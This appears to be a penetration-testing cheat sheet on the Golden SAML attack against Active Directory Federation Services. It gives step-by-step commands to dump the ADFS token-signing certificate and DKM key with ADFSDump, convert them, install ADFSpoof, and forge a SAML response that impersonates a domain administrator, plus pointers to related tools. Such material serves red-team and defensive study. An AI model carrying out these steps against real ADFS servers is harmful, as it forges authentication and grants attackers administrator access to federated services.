# Active Directory - Federation Services

## ADFS - Golden SAML

**Requirements**:

* ADFS service account
* The private key (PFX with the decryption password)

**Exploitation**:

* Run [mandiant/ADFSDump](https://github.com/mandiant/ADFSDump) on AD FS server as the AD FS service account. It will query the Windows Internal Database (WID): `\\.\pipe\MICROSOFT##WID\tsql\query`
* Convert PFX and Private Key to binary format
    ```ps1
    # For the pfx
    echo AAAAAQAAAAAEE[...]Qla6 | base64 -d > EncryptedPfx.bin
    # For the private key
    echo f7404c7f[...]aabd8b | xxd -r -p > dkmKey.bin 
    ```
* Create the Golden SAML using [mandiant/ADFSpoof](https://github.com/mandiant/ADFSpoof), you might need to update the [dependencies](https://github.com/szymex73/ADFSpoof).
    ```ps1
    mkdir ADFSpoofTools
    cd $_
    git clone https://github.com/dmb2168/cryptography.git
    git clone https://github.com/mandiant/ADFSpoof.git 
    virtualenv3 venvADFSSpoof
    source venvADFSSpoof/bin/activate
    pip install lxml
    pip install signxml
    pip uninstall -y cryptography
    cd cryptography
    pip install -e .
    cd ../ADFSpoof
    pip install -r requirements.txt
    python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.pentest.lab saml2 --endpoint https://www.contoso.com/adfs/ls
    /SamlResponseServlet --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid 'PENTEST\administrator' --rpidentifier Supervision --assertions '<Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"><AttributeValue>PENTEST\administrator</AttributeValue></Attribute>'
    ```

Other interesting tools to exploit AD FS: 

* [secureworks/whiskeysamlandfriends/WhiskeySAML](https://github.com/secureworks/whiskeysamlandfriends/tree/main/whiskeysaml) - Proof of concept for a Golden SAML attack with Remote ADFS Configuration Extraction.


## References

* [I AM AD FS AND SO CAN YOU - Douglas Bienstock & Austin Baker - Mandiant](https://troopers.de/downloads/troopers19/TROOPERS19_AD_AD_FS.pdf)